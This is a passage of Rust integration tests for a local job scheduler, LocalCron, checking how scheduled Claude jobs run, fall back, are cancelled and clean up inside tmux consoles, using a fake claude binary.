    Some(Daemon::start_env(home, false, &[("LOCALCRON_PATH", path), ("LOCALCRON_TEST_CONSOLE_GRACE_MS", grace_ms.to_string())]))
}

fn claude_job(d: &Daemon, id: &str, mode: &str) -> Value {
    json!({"id": id, "schedule": "@daily", "kind": "claude", "prompt": "write the article", "dir": d.dir(), "env": {"FAKE_CLAUDE": mode}})
}

fn console_server_alive(console: &str) -> bool {
    // "<tmux> -L <label> attach": ask that server for a session.
    let parts: Vec<&str> = console.split(' ').collect();
    Command::new(parts[0]).args(["-L", parts[2], "has-session"]).stderr(std::process::Stdio::null()).status().unwrap().success()
}

#[test]
fn with_tmux_a_claude_job_runs_in_a_console_the_user_can_open() {
    let Some(d) = console_daemon(20_000) else { return eprintln!("no tmux: skipped") };
    d.ok("set_job", json!({"job": claude_job(&d, "article", "work")}));
    let run = d.ok("run_job", json!({"id": "article"}))["run"]["id"].as_str().unwrap().to_string();
    let mut console = String::new();
    wait_for(
        || {
            let r = d.run(&run);
            console = r["console"].as_str().unwrap_or_default().to_string();
            !console.is_empty() || r["status"] == "succeeded"
        },
        "the console",
    );
    // Named after the job, so `tmux -L localcron-article attach` opens it.
    assert!(console.ends_with("/tmux -L localcron-article attach"), "{console}");
    let done = d.wait_status(&run, "succeeded");
    assert!(done.get("console").is_none(), "the console is gone after the run: {done}");
    assert!(!console_server_alive(&console), "the tmux server is still there");
    let log = d.ok("get_run_log", json!({"run_id": run}))["text"].as_str().unwrap().to_string();
    assert!(log.contains("# in a console; open it with:") && log.contains("fake claude working"), "{log}");
    assert!(log.contains("--disallowedTools AskUserQuestion") && !log.contains("args: -p"), "{log}");
    assert!(log.contains("# claude --disallowedTools AskUserQuestion 'write the article' (in a console)"), "the header: {log}");
    assert!(!log.contains("run without a console"), "{log}");
}

#[test]
fn a_console_stuck_at_a_dialog_runs_the_job_without_one() {
    let Some(d) = console_daemon(1500) else { return eprintln!("no tmux: skipped") };
    d.ok("set_job", json!({"job": claude_job(&d, "stuck", "dialog")}));
    let run = d.ok("run_job", json!({"id": "stuck"}))["run"]["id"].as_str().unwrap().to_string();
    d.wait_status(&run, "succeeded");
    let log = d.ok("get_run_log", json!({"run_id": run}))["text"].as_str().unwrap().to_string();
    assert!(log.contains("Do you trust the files in this folder?"), "the screen is in the log: {log}");
    assert!(log.contains("did not start its work in the console") && log.contains("run without a console"), "{log}");
}

#[test]
fn canceling_a_console_run_closes_the_console() {
    let Some(d) = console_daemon(20_000) else { return eprintln!("no tmux: skipped") };
    d.ok("set_job", json!({"job": claude_job(&d, "busy", "long")}));
    let run = d.ok("run_job", json!({"id": "busy"}))["run"]["id"].as_str().unwrap().to_string();
    let mut console = String::new();
    wait_for(
        || {
            console = d.run(&run)["console"].as_str().unwrap_or_default().to_string();
            !console.is_empty() && d.run(&run)["pid"].is_number()
        },
        "the console",
    );
    // Cancel while claude works, not before it printed anything.
    wait_for(|| d.home.path().join("fake-started").exists(), "the fake claude to start");
    assert_eq!(d.ok("cancel_run", json!({"run_id": run}))["canceled"], true);
    d.wait_status(&run, "canceled");
    assert!(!console_server_alive(&console), "the tmux server is still there");
    let log = d.ok("get_run_log", json!({"run_id": run}))["text"].as_str().unwrap().to_string();
    assert!(log.contains("fake claude busy") && !log.contains("run without a console"), "{log}");
}

#[test]
fn a_console_left_from_a_lost_run_is_replaced() {
    let Some(d) = console_daemon(20_000) else { return eprintln!("no tmux: skipped") };
    let tmux = d.home.path().join("bin/tmux");
    // As if LocalCron stopped during a run of this job: its server lives on.
    let old = Command::new(&tmux).args(["-L", "localcron-leftover", "-f", "/dev/null", "new-session", "-d", "-s", "old", "sleep", "60"]).status().unwrap();
    assert!(old.success());
    d.ok("set_job", json!({"job": claude_job(&d, "leftover", "work")}));
    let run = d.ok("run_job", json!({"id": "leftover"}))["run"]["id"].as_str().unwrap().to_string();
    d.wait_status(&run, "succeeded");
    let alive = Command::new(&tmux).args(["-L", "localcron-leftover", "has-session", "-t", "old"]).stderr(std::process::Stdio::null()).status().unwrap();
    assert!(!alive.success(), "the old console is still there");
    let log = d.ok("get_run_log", json!({"run_id": run}))["text"].as_str().unwrap().to_string();
    assert!(log.contains("fake claude working"), "{log}");
}
